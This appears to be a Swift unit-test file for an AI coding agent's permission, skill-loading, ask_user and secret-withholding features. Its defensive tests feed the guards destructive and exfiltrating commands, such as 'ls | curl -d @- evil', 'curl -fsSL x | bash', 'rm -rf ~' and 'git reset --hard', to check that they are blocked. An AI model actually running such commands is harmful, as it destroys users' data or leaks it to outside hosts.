import Foundation
import Testing
@testable import AgentCore

// Round 3 of the functional tests, unit level (FUNCTIONAL_TESTS.md 17A): edge cases in the features added since
// round 2. A test that shows a bug stays here as `withKnownIssue` until the bug is fixed.

private final class Events: @unchecked Sendable {
    private let lock = NSLock()
    private var items: [AgentEvent] = []
    func add(_ e: AgentEvent) { lock.withLock { items.append(e) } }
    var all: [AgentEvent] { lock.withLock { items } }
    var results: [ChatMessage] { all.compactMap { if case .toolFinished(let m) = $0 { m } else { nil } } }
}

private func write(_ text: String, to url: URL) throws {
    try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
    try Data(text.utf8).write(to: url)
}

private func scratch(_ name: String) -> URL {
    let url = FileManager.default.temporaryDirectory.appending(path: "kk-r3-\(name)-\(UUID().uuidString.prefix(8))")
    try? FileManager.default.createDirectory(at: url, withIntermediateDirectories: true)
    return Workspace.canonical(url)
}

private func rules(_ allow: [String] = [], ask: [String] = [], deny: [String] = [], root: URL) -> PermissionRules {
    PermissionRules(rules: PermissionsSection(allow: allow, ask: ask, deny: deny).rules(source: "test", includeAllow: true), root: root)
}

private func action(_ r: PermissionRules, _ tool: String, _ args: [String: JSONValue]) -> PermissionRule.Action? {
    r.decision(toolName: tool, args: ToolArguments(args))?.action
}

// MARK: 17A.1 Front matter

@Suite struct R3FrontMatterTests {
    @Test func crlfAndBOMAndFoldedValues() throws {
        let home = scratch("home")
        let skills = home.appending(path: ".claude/skills")
        try write("---\r\nname: crlf\r\ndescription: Written on Windows.\r\n---\r\nBody.\r\n", to: skills.appending(path: "crlf/SKILL.md"))
        try write("\u{FEFF}---\nname: bom\ndescription: Saved with a BOM.\n---\nBody.\n", to: skills.appending(path: "bom/SKILL.md"))
        try write("---\nname: folded\ndescription: >\n  First part.\n\n  After a blank line.\n---\nBody.\n", to: skills.appending(path: "folded/SKILL.md"))
        try write("---\nname: \"Two Words\"\ndescription: 'Use when: the user says so'\n---\nBody.\n", to: skills.appending(path: "two/SKILL.md"))
        let found = Dictionary(Skills.load(root: nil, home: home).map { ($0.name, $0.description) }, uniquingKeysWith: { a, _ in a })
        #expect(found["two words"] == "Use when: the user says so")
        #expect(found["folded"]?.hasPrefix("First part.") == true)
        #expect(found["crlf"] == "Written on Windows.")
    
        #expect(found["bom"] == "Saved with a BOM.")
    
    }

    @Test func crlfCustomCommandKeepsItsDescription() throws {
        let root = scratch("cmd")
        try write("---\r\ndescription: Review the diff\r\n---\r\nReview $ARGUMENTS\r\n", to: root.appending(path: ".kurtkode/commands/audit.md"))
        let c = SlashCommands.all(workspace: root, home: scratch("h")).first { $0.name == "audit" }
        #expect(c?.description == "Review the diff")
        if case .custom(let template, _)? = c?.kind { #expect(!template.contains("description:")) }
    
    }
}

// MARK: 17A.2 Skill places

@Suite struct R3SkillPlaceTests {
    @Test func symlinkedSkillFolderLoadsAndIsReadable() async throws {
        let home = scratch("home"), elsewhere = scratch("real")
        try write("---\ndescription: Linked in.\n---\nRead notes.md.\n", to: elsewhere.appending(path: "SKILL.md"))
        try write("notes\n", to: elsewhere.appending(path: "notes.md"))
        try FileManager.default.createDirectory(at: home.appending(path: ".claude/skills"), withIntermediateDirectories: true)
        try FileManager.default.createSymbolicLink(at: home.appending(path: ".claude/skills/linked"), withDestinationURL: elsewhere)
        let skills = Skills.load(root: nil, home: home)
        #expect(skills.map(\.name) == ["linked"])
        #expect(skills.first?.folder == elsewhere)
    }

    @Test func aHugeSkillFolderListsQuickly() async throws {
        let home = scratch("home")
        let folder = home.appending(path: ".claude/skills/big")
        try write("---\ndescription: Big.\n---\nBody.\n", to: folder.appending(path: "SKILL.md"))
        for i in 0..<3000 { try write("x", to: folder.appending(path: "vendor/d\(i % 30)/f\(i).txt")) }
        let ws = Workspace(root: scratch("proj"))
        let start = Date()
        let out = try await SkillTool(skills: Skills.load(root: nil, home: home)).run(ToolArguments(["name": "big"]), context: ToolContext(workspace: ws))
        #expect(Date().timeIntervalSince(start) < 2)
        #expect(out.text.components(separatedBy: "\n- ").count <= 41)
    }
}

// MARK: 17A.4 ask_user

@Suite struct R3AskUserTests {
    @Test func twoQuestionsInOneTurnAreAnsweredInOrder() async throws {
        let ws = try makeProject()
        let (client, _) = MockServer.client(.init(turns: [
            SSE.toolCalls([("q1", "ask_user", #"{"question":"First?"}"#), ("q2", "ask_user", #"{"question":"Second?"}"#)]),
            SSE.content("ok"),
        ]))
        var config = AgentConfig(tools: AllTools.all)
        config.askUser = { questions in questions.map { "answer to " + $0.question } }
        let events = Events()
        await AgentLoop.run(client: client, model: "m", systemPrompt: "S", history: [.user("go")], config: config, workspace: ws) { events.add($0) }
        #expect(events.results.map(\.content) == ["The user answered: answer to First?", "The user answered: answer to Second?"])
        #expect(events.results.map(\.toolCallID) == ["q1", "q2"])
    }

    @Test func aSubagentIsNotOfferedAskUser() async throws {
        let ws = try makeProject()
        let task = #"{"description":"Look","prompt":"Look around","agent":"general"}"#
        let (client, host) = MockServer.client(.init(turns: [
            SSE.toolCall("t1", "task", task),
            SSE.content("Nothing to report."),
            SSE.content("Done."),
        ]))
        var config = AgentConfig(tools: AllTools.all)
        config.subagents = SubagentSetup()
        config.askUser = { _ in ["x"] }
        await AgentLoop.run(client: client, model: "m", systemPrompt: "S", history: [.user("go")], config: config, workspace: ws) { _ in }
        let bodies = MockServer.requestBodies(host)
        #expect(bodies.count == 3)
        #expect(String(decoding: bodies[0], as: UTF8.self).contains("\"ask_user\""))
        #expect(!String(decoding: bodies[1], as: UTF8.self).contains("\"ask_user\""))
    }

    @Test func aDenyRuleBlocksAskUserByClaudeName() async throws {
        let ws = try makeProject()
        let (client, _) = MockServer.client(.init(turns: [SSE.toolCall("q1", "ask_user", #"{"question":"Which?"}"#), SSE.content("ok")]))
        var config = AgentConfig(tools: AllTools.all)
        config.askUser = { _ in ["never"] }
        config.permissionRules = rules(deny: ["AskUserQuestion"], root: ws.root)
        let events = Events()
        await AgentLoop.run(client: client, model: "m", systemPrompt: "S", history: [.user("go")], config: config, workspace: ws) { events.add($0) }
        #expect(events.results.first?.content.contains("permission rule denies") == true)
    }

    @Test func planModeOffersSkillAndAskUser() async throws {
        let ws = try makeProject()
        try write("---\ndescription: d\n---\nb\n", to: ws.root.appending(path: ".claude/skills/s/SKILL.md"))
        let (client, host) = MockServer.client(.init(turns: [SSE.toolCall("q1", "ask_user", #"{"question":"Which?"}"#), SSE.content("ok")]))
        var config = AgentConfig(tools: AllTools.all, policy: PermissionPolicy(mode: .plan))
        config.askUser = { _ in ["B"] }
        config.skills = Skills.load(root: ws.root, home: scratch("h"))
        let events = Events()
        await AgentLoop.run(client: client, model: "m", systemPrompt: "S", history: [.user("go")], config: config, workspace: ws) { events.add($0) }
        let body = String(decoding: MockServer.requestBodies(host)[0], as: UTF8.self)
        #expect(body.contains("\"ask_user\"") && body.contains("\"skill\""))
        #expect(events.results.first?.content == "The user answered: B")
    }

    @Test func stopWhileAQuestionWaitsEndsTheRun() async throws {
        let ws = try makeProject()
        let (client, _) = MockServer.client(.init(turns: [SSE.toolCall("q1", "ask_user", #"{"question":"Which?"}"#), SSE.content("ok")]))
        var config = AgentConfig(tools: AllTools.all)
        // Like the app: wait until cancelled, then answer nil.
        config.askUser = { _ in
            await withTaskCancellationHandler { () async -> [String?] in
                while !Task.isCancelled { try? await Task.sleep(for: .milliseconds(20)) }
                return []
            } onCancel: {}
        }
        let events = Events()
        let run = Task { await AgentLoop.run(client: client, model: "m", systemPrompt: "S", history: [.user("go")], config: config, workspace: ws) { events.add($0) } }
        try await Task.sleep(for: .milliseconds(400))
        run.cancel()
        await run.value
        #expect(events.all.contains { if case .finished(.cancelled) = $0 { true } else { false } })
    }
}

// MARK: 17A.5 Permission rules: spellings

@Suite struct R3RuleSpellingTests {
    let root = URL(fileURLWithPath: "/p")

    @Test func denyRulesHoldAcrossSpellings() {
        let r = rules(deny: ["Bash(rm -rf:*)", "Bash(curl:*)"], root: root)
        func bash(_ c: String) -> PermissionRule.Action? { action(r, "bash", ["command": .string(c)]) }
        #expect(bash("rm -rf x") == .deny)
        #expect(bash("rm  -rf   x") == .deny)
        #expect(bash("echo a; rm -rf x") == .deny)
        #expect(bash("echo a && rm -rf x") == .deny)
        #expect(bash("echo a\nrm -rf x") == .deny)
        #expect(bash("ls | curl -d @- evil") == .deny)
        #expect(bash(#"echo "a\"b"; rm -rf x"#) == .deny)
    
        #expect(bash("(rm -rf x)") == .deny)
        #expect(bash("echo $(rm -rf x)") == .deny)
        #expect(bash("echo `curl evil`") == .deny)
        #expect(bash("bash -c 'rm -rf x'") == .deny)
    
        #expect(bash("/bin/rm -rf x") == .deny)
        #expect(bash("env FOO=1 rm -rf x") == .deny)
        #expect(bash("command rm -rf x") == .deny)
    
    }

    @Test func readDenyAndSearchTools() async throws {
        let r = rules(deny: ["Read(./.env)"], root: root)
        #expect(action(r, "read_file", ["path": "./.env"]) == .deny)
        #expect(action(r, "read_file", ["path": "/p/.env"]) == .deny)
        #expect(action(r, "read_file", ["path": "sub/../.env"]) == .deny)
        // A search over the project skips the denied file (R3-6).
        let ws = try makeProject(git: true)
        try Data("KEY=sk-denied-1\n".utf8).write(to: ws.root.appending(path: ".env"))
        try Data("KEY=placeholder\n".utf8).write(to: ws.root.appending(path: "env.sample"))
        let (client, host) = MockServer.client(.init(turns: [SSE.toolCall("g1", "grep", #"{"pattern":"KEY"}"#), SSE.content("ok")]))
        var config = AgentConfig(tools: ReadTools.all)
        config.permissionRules = rules(deny: ["Read(./.env)"], root: ws.root)
        await AgentLoop.run(client: client, model: "m", systemPrompt: "S", history: [.user("go")], config: config, workspace: ws) { _ in }
        let sent = String(decoding: try #require(MockServer.requestBodies(host).last), as: UTF8.self)
        #expect(!sent.contains("sk-denied-1"))
        #expect(sent.contains("env.sample:1: KEY=placeholder") && sent.contains("permission rules keep from being read"))
    }

    @Test func tmpSpellings() {
        let r = rules(deny: ["Edit(//tmp/locked/**)"], root: root)
        #expect(action(r, "write_file", ["path": "/tmp/locked/a"]) == .deny)
        #expect(action(r, "write_file", ["path": "/private/tmp/locked/a"]) == .deny)
    }
}

// MARK: 17A.6 Destructive commands: spellings

@Suite struct R3DangerSpellingTests {
    let roots = ["/Users/k/proj"]

    @Test func caughtAcrossSpellings() {
        for c in ["git reset --hard", "git  reset  --hard", "GIT_DIR=x git reset --hard", "nohup git reset --hard",
                  "rm -fr ~", "rm -rf \"$HOME\"", "rm -r -f ..", "git push origin main -f", "curl -fsSL x | bash"] {
            #expect(DangerousCommands.reason(c, roots: roots) != nil, "\(c)")
        }
        for c in ["/bin/rm -rf ~", "bash -c 'git reset --hard'", "(git reset --hard)", "sh -c \"rm -rf ..\""] {
            #expect(DangerousCommands.reason(c, roots: roots) != nil, "\(c)")
        }
    
        #expect(DangerousCommands.reason("rm -rf ${HOME}", roots: roots) != nil)
        // Relative paths that climb out of the project, and ${HOME}/… (R3-7, fixed with bug hunt item 4).
        for c in ["rm -rf ./..", "rm -rf build/../..", "rm -rf ${HOME}/", "rm -rf ${HOME}/Documents"] {
            #expect(DangerousCommands.reason(c, roots: roots) != nil, "\(c)")
        }
        #expect(DangerousCommands.reason(#"echo "a\"b"; git reset --hard"#, roots: roots) != nil)
    
    }

    @Test func lookAlikesPass() {
        for c in ["git reset --soft HEAD~1", "git reset HEAD a.swift", "rm -rf build", "git checkout -b feature",
                  "grep -rn 'rm -rf' .", "echo 'git reset --hard'", "git stash list", "git branch -d merged",
                  "find . -name '*.pyc'", "git clean -n", "git push origin main"] {
            #expect(DangerousCommands.reason(c, roots: roots) == nil, "\(c)")
        }
    }

    @Test func aBroadAllowRuleSkipsTheDangerCheck() async throws {
        let ws = try makeProject(git: true)
        let (client, _) = MockServer.client(.init(turns: [SSE.toolCall("b1", "bash", #"{"command":"git reset --hard"}"#), SSE.content("ok")]))
        var config = AgentConfig(tools: AllTools.all)
        config.permissionRules = rules(["Bash(git:*)"], root: ws.root)
        final class Asked: @unchecked Sendable { var n = 0 }
        let asked = Asked()
        config.approve = { _ in asked.n += 1; return .deny(feedback: nil) }
        await AgentLoop.run(client: client, model: "m", systemPrompt: "S", history: [.user("go")], config: config, workspace: ws) { _ in }
        #expect(asked.n == 1)
    
    }

    @Test func anAskRuleOnAReadInPlanModeAsksInsteadOfRefusing() async throws {
        let ws = try makeProject()
        let (client, _) = MockServer.client(.init(turns: [SSE.toolCall("r1", "read_file", #"{"path":"README.md"}"#), SSE.content("ok")]))
        var config = AgentConfig(tools: AllTools.all, policy: PermissionPolicy(mode: .plan))
        config.permissionRules = rules(ask: ["Read(README.md)"], root: ws.root)
        config.approve = { _ in .allow }
        let events = Events()
        await AgentLoop.run(client: client, model: "m", systemPrompt: "S", history: [.user("go")], config: config, workspace: ws) { events.add($0) }
        withKnownIssue("plan mode refuses a read that an ask rule covers, saying it isn't available (R3-9)") {
            #expect(events.results.first?.toolResult?.isError != true)
        }
    }
}

// MARK: From the code review (safety, skills, ask_user)

@Suite struct R3ReviewTests {
    @Test func anEmptyProjectAllowRuleIsNotShownAsTheFileName() throws {
        let home = scratch("home"), root = scratch("proj")
        try write(#"{"permissions":{"allow":["", "Bash(ls)"]}}"#, to: root.appending(path: ".claude/settings.json"))
        let approvals = PermissionApprovals(fileURL: scratch("ap").appending(path: "a.json"))
        let (_, pending, _) = PermissionRules.load(root: root, approvals: approvals, home: home)
        #expect(pending?.rules.contains(".claude/settings.json") == false)
    
    }

    @Test func anApprovedEmptyAllowRuleDoesNotCrash() throws {
        let home = scratch("home"), root = scratch("proj")
        try write(#"{"permissions":{"allow":["", "Bash(ls)"]}}"#, to: root.appending(path: ".claude/settings.json"))
        let approvals = PermissionApprovals(fileURL: scratch("ap").appending(path: "a.json"))
        let (_, pending, _) = PermissionRules.load(root: root, approvals: approvals, home: home)
        try approvals.approve(try #require(pending).fingerprint, workspace: root)
        let (rules, after, _) = PermissionRules.load(root: root, approvals: approvals, home: home)
        #expect(after == nil && rules.rules.map(\.text) == ["Bash(ls)"])
    }

    @Test func apostrophesInCommentsDontHideCommands() {
        #expect(DangerousCommands.reason("# don't worry\nrm -rf ~", roots: ["/p"]) != nil)
        #expect(DangerousCommands.reason(#"echo it\'s; git push --force origin main"#, roots: ["/p"]) != nil)
    
    }

    @Test func readDenyRulesAndCaseAndDotfiles() {
        let r = rules(deny: ["Read(./.env)", "Read(./secrets/*)"], root: URL(fileURLWithPath: "/p"))
        #expect(action(r, "read_file", ["path": ".ENV"]) == .deny)
    
        #expect(action(r, "read_file", ["path": "secrets/.key"]) == .deny)
    
    }

    @Test func readOnlyFoldersAreNotTheProjectForDeletes() {
        withKnownIssue("rm -rf inside a read-only extra folder (a skill folder) isn't flagged (R3-12)") {
            #expect(DangerousCommands.reason("rm -rf /Users/k/.claude/skills/foo/scripts",
                                             roots: ["/Users/k/proj", "/Users/k/.claude/skills/foo"]) != nil)
        }
    }

    @Test func falsePositives() {
        for (c, issue) in [("find . -name '*.pyc' -delete", "deleting matches inside the project"),
                           ("git restore -S file.swift", "-S is --staged"),
                           ("rm --force ~/old.log", "--force is read as -r (rm -f ~/old.log passes)")] {
            withKnownIssue("flagged as dangerous: \(issue) (R3-13)") {
                #expect(DangerousCommands.reason(c, roots: ["/p"]) == nil, "\(c)")
            }
        }
    }

    @Test func smallerRuleMatching() {
        let r = rules(["mcp__notes__*", "Bash(npm  run test:*)"], deny: ["Edit(//private/tmp/locked/**)"], root: URL(fileURLWithPath: "/p"))
        withKnownIssue("mcp__server__* isn't a wildcard (R3-14)") { #expect(action(r, "mcp__notes__add", [:]) == .allow) }
        #expect(action(r, "bash", ["command": "npm run test"]) == .allow)              // a :* prefix's spacing doesn't matter
        withKnownIssue("//private/tmp patterns never match, paths are canonicalized to /tmp (R3-14)") {
            #expect(action(r, "write_file", ["path": "/tmp/locked/a"]) == .deny)
        }
    }

    @Test func theSameQuestionTwiceIsAskedTwice() async throws {
        let ws = try makeProject()
        let (client, _) = MockServer.client(.init(turns: [
            SSE.toolCall("q1", "ask_user", #"{"question":"Ready?"}"#),
            SSE.toolCall("q2", "ask_user", #"{"question":"Ready?"}"#),
            SSE.content("ok"),
        ]))
        final class Count: @unchecked Sendable { var n = 0 }
        let count = Count()
        var config = AgentConfig(tools: AllTools.all)
        config.askUser = { _ in count.n += 1; return [count.n == 1 ? "not yet" : "yes"] }
        await AgentLoop.run(client: client, model: "m", systemPrompt: "S", history: [.user("go")], config: config, workspace: ws) { _ in }
        #expect(count.n == 2)
    
    }

    @Test func readsBetweenRepeatsResetTheRepeatCount() async throws {
        let ws = try makeProject()
        let test = #"{"command":"echo test run"}"#, read = #"{"path":"README.md"}"#
        let (client, _) = MockServer.client(.init(turns: [
            SSE.toolCall("b1", "bash", test), SSE.toolCall("r1", "read_file", read),
            SSE.toolCall("b2", "bash", test), SSE.toolCall("r2", "read_file", #"{"path":"AGENTS.md"}"#),
            SSE.toolCall("b3", "bash", test), SSE.content("ok"),
        ]))
        final class Count: @unchecked Sendable { var n = 0 }
        let asked = Count()
        var config = AgentConfig(tools: AllTools.all)
        config.approve = { _ in asked.n += 1; return .allow }
        await AgentLoop.run(client: client, model: "m", systemPrompt: "S", history: [.user("go")], config: config, workspace: ws) { _ in }
        #expect(asked.n == 0)
    
    }
}

// MARK: From the code review (native APIs, costs, privacy)

private func anthropic(_ events: [String]) -> [Data] { events.map { Data("data: \($0)\n\n".utf8) } }
private let aStart = #"{"type":"message_start","message":{"model":"claude-opus-5-5","usage":{"input_tokens":1000,"output_tokens":1}}}"#
private func aText(_ i: Int, _ t: String) -> [String] {
    [#"{"type":"content_block_start","index":\#(i),"content_block":{"type":"text","text":"\#(t)"}}"#, #"{"type":"content_block_stop","index":\#(i)}"#]
}
private func aEnd(_ reason: String) -> [String] {
    [#"{"type":"message_delta","delta":{"stop_reason":"\#(reason)"},"usage":{"output_tokens":20}}"#, #"{"type":"message_stop"}"#]
}

@Suite struct R3NativeReviewTests {
    @Test func noWhitespaceOnlyTextBlocksGoToClaude() throws {
        var a = ChatMessage(role: .assistant, content: "\n")
        a.toolCalls = [ToolCall(id: "c1", name: "read_file", arguments: #"{"path":"x"}"#)]
        let t = ChatMessage(role: .tool, content: "x", toolCallID: "c1")
        let turns = AnthropicWire.encodeMessages([.user("go"), a, t], model: "claude-opus-5-5", images: false)
        let text = String(decoding: try JSONEncoder().encode(JSONValue.array(turns)), as: UTF8.self)
        #expect(!text.contains(#""text":"\n""#))
    
    }

    @Test func claudeAndGeminiOverflowErrorsAreRecognized() {
        func failed(_ e: String) -> ChatMessage {
            var m = ChatMessage(role: .assistant, content: "")
            m.meta = TurnMeta(requestedModel: "m", stopReason: .failed, error: e, duration: 1)
            return m
        }
        #expect(Compactor.isOverflowError(failed("This model's maximum context length is 65536 tokens")))
        #expect(Compactor.isOverflowError(failed("invalid_request_error: prompt is too long: 215000 tokens > 200000 maximum")))
        #expect(Compactor.isOverflowError(failed("The input token count (1200000) exceeds the maximum number of tokens allowed (1048576).")))
    
    }

    @Test func anOverloadedErrorEventIsRetried() async throws {
        let ws = try makeProject()
        let overloaded = anthropic([aStart, #"{"type":"error","error":{"type":"overloaded_error","message":"Overloaded"}}"#])
        let good = anthropic([aStart] + aText(0, "Hello.") + aEnd("end_turn"))
        let (client, host) = MockServer.client(.init(turns: [overloaded, good]), api: .anthropic)
        let events = Events()
        await AgentLoop.run(client: client, model: "claude-opus-5-5", systemPrompt: "S", history: [.user("hi")],
                            config: AgentConfig(tools: ReadTools.all), workspace: ws) { events.add($0) }
        #expect(MockServer.requestBodies(host).count == 2)
        #expect(events.all.contains { if case .finished(.completed) = $0 { true } else { false } })
    }

    @Test func aPausedTurnIsContinued() async throws {
        let ws = try makeProject()
        let paused = anthropic([aStart] + aText(0, "Searching…") + aEnd("pause_turn"))
        let good = anthropic([aStart] + aText(0, "Found it.") + aEnd("end_turn"))
        let (client, host) = MockServer.client(.init(turns: [paused, good]), api: .anthropic)
        await AgentLoop.run(client: client, model: "claude-opus-5-5", systemPrompt: "S", history: [.user("search")],
                            config: AgentConfig(tools: ReadTools.all), workspace: ws) { _ in }
        let bodies = MockServer.requestBodies(host)
        #expect(bodies.count == 2)
        // Sent back as it is: the paused reply is the last message (no "Continue." after it).
        if bodies.count == 2, case .object(let o)? = try? JSONDecoder().decode(JSONValue.self, from: bodies[1]),
           case .array(let ms)? = o["messages"], case .object(let last)? = ms.last {
            #expect(last["role"] == "assistant")
        }
    }

    @Test func aRefusalAfterAToolCallDoesntRunIt() async throws {
        let ws = try makeProject()
        let stream = anthropic([aStart,
            #"{"type":"content_block_start","index":0,"content_block":{"type":"tool_use","id":"toolu_1","name":"write_file","input":{}}}"#,
            #"{"type":"content_block_delta","index":0,"delta":{"type":"input_json_delta","partial_json":"{\"path\":\"ran.txt\",\"content\":\"x\"}"}}"#,
            #"{"type":"content_block_stop","index":0}"#] + aEnd("refusal"))
        let (client, _) = MockServer.client(.init(turns: [stream, anthropic([aStart] + aText(0, "ok") + aEnd("end_turn"))]), api: .anthropic)
        await AgentLoop.run(client: client, model: "claude-opus-5-5", systemPrompt: "S", history: [.user("go")],
                            config: AgentConfig(tools: AllTools.all), workspace: ws) { _ in }
        #expect(!FileManager.default.fileExists(atPath: ws.root.appending(path: "ran.txt").path))
    
    }

    @Test func aCutStreamStillCountsItsInput() async throws {
        let (client, _) = MockServer.client(MockServer.Route(chunks: anthropic([aStart] + [aText(0, "Half")[0]])), api: .anthropic)
        let reply = await TurnRunner.run(client: client, request: ChatRequest(model: "claude-opus-5-5", messages: [.user("x")], maxTokens: 100),
                                         limits: TurnLimits(maxTokens: 100, wallClock: 30)) { _ in }
        #expect(reply.meta?.stopReason == .failed)
        #expect(reply.meta?.usage?.promptTokens == 1000)
    
    }

    @Test func idlessCallsGetPlaceholdersEachTime() {
        var a1 = ChatMessage(role: .assistant, content: "")
        a1.toolCalls = [ToolCall(id: "call_0", name: "read_file", arguments: "{}")]
        let t1 = ChatMessage(role: .tool, content: "x", toolCallID: "call_0")
        var a2 = ChatMessage(role: .assistant, content: "")
        a2.toolCalls = [ToolCall(id: "call_0", name: "read_file", arguments: "{}")]    // stopped before its result
        let out = AgentLoop.sendable([.user("go"), a1, t1, a2, .user("continue")])
        #expect(out.filter { $0.role == .tool }.count == 2)
    
    }

    @Test(arguments: [false, true]) func withheldFilesThroughSymlinksAndFolders(git: Bool) async throws {
        let ws0 = try makeProject(git: git)
        try Data("SECRET=sk-live-9\n".utf8).write(to: ws0.root.appending(path: ".env"))
        try FileManager.default.createSymbolicLink(at: ws0.root.appending(path: "config.txt"), withDestinationURL: ws0.root.appending(path: ".env"))
        try write("KEY=nested-secret\n", to: ws0.root.appending(path: "secrets/a/b.txt"))
        var ws = ws0
        ws.withheld = WithheldFiles(patterns: WithheldFiles.defaults + ["secrets/"], host: "api.example.com")
        #expect(throws: ToolFailure.self) { try ws.resolve("config.txt") }          // read_file resolves the link
        let grep = try await GrepTool().run(ToolArguments(["pattern": "SECRET"]), context: ToolContext(workspace: ws))
        #expect(!grep.text.contains("sk-live-9"), "git: \(git)")
    
        #expect(throws: ToolFailure.self) { try ws.resolve("secrets/a/b.txt") }
    
    }

    @Test func hostnamesStartingWithFdAreRemote() {
        #expect(Endpoint.isThirdParty(URL(string: "https://api.anthropic.com")!))
        #expect(!Endpoint.isThirdParty(URL(string: "http://[fd12::1]:1234")!))
        #expect(Endpoint.isThirdParty(URL(string: "https://fdai.example.com/v1")!))
    
    }
}

// MARK: The command splitter (R3-3, R3-5)

@Suite struct ShellSplitTests {
    @Test func splitsAndLooksInside() {
        func cmds(_ s: String) -> [String] { ShellSplit.commands(s).map { $0.joined(separator: " ") } }
        #expect(cmds("git status && git diff | less; echo done") == ["git status", "git diff", "less", "echo done"])
        #expect(cmds(#"git commit -m "fix; it's \"done\"" && git push"#) == [#"git commit -m fix; it's "done""#, "git push"])
        #expect(cmds("echo $(git rev-parse HEAD) `whoami`") == ["echo $(…) $(…)", "git rev-parse HEAD", "whoami"])
        #expect(cmds(#"echo "today: $(date +%F)""#) == ["echo today: $(…)", "date +%F"])
        #expect(cmds("echo '$(not run)'") == ["echo $(not run)"])                       // single quotes are literal
        #expect(cmds("bash -lc 'cd x && make'") == ["bash -lc cd x && make", "cd x", "make"])
        #expect(cmds("ls # don't care\npwd") == ["ls", "pwd"])
        #expect(cmds("make 2>&1 | tee log &>/dev/null") == ["make 2>&1", "tee log &>/dev/null"])
        #expect(cmds("cat > notes.md <<'EOF'\nDon't rm -rf ~ here; it's text\nEOF\necho after") == ["cat > notes.md <<", "echo after"])
        #expect(cmds("grep x <<< 'a b'") == ["grep x <<< a b"])
        #expect(ShellSplit.unwrap(["FOO=1", "env", "-u", "X", "nice", "-n", "5", "timeout", "30", "/usr/bin/git", "status"]) == ["git", "status"])
        #expect(ShellSplit.unwrap(["sudo", "-u", "root", "xargs", "-n", "1", "rm"]) == ["rm"])
    }

    @Test func onlyARuleNamingTheDangerSkipsTheCheck() {
        #expect(DangerousCommands.ruleNamesDanger("git reset --hard:*"))
        #expect(DangerousCommands.ruleNamesDanger("git push --force origin main"))
        #expect(!DangerousCommands.ruleNamesDanger("git:*"))
        #expect(!DangerousCommands.ruleNamesDanger("git push:*"))
        #expect(!DangerousCommands.ruleNamesDanger("rm:*"))
    }
}

@Suite struct GrepLinkTests {
    @Test func aLinkToAFileOutsideTheWorkspaceIsntFollowed() async throws {
        let ws = try makeProject(git: true)
        let outside = scratch("out").appending(path: "notes.txt")
        try Data("greet from outside\n".utf8).write(to: outside)
        try FileManager.default.createSymbolicLink(at: ws.root.appending(path: "notes-link.txt"), withDestinationURL: outside)
        let out = try await GrepTool().run(ToolArguments(["pattern": "greet"]), context: ToolContext(workspace: ws))
        #expect(!out.text.contains("from outside"))
        #expect(out.text.contains("[1 link to files outside the workspace weren't followed.]"))
    }
}
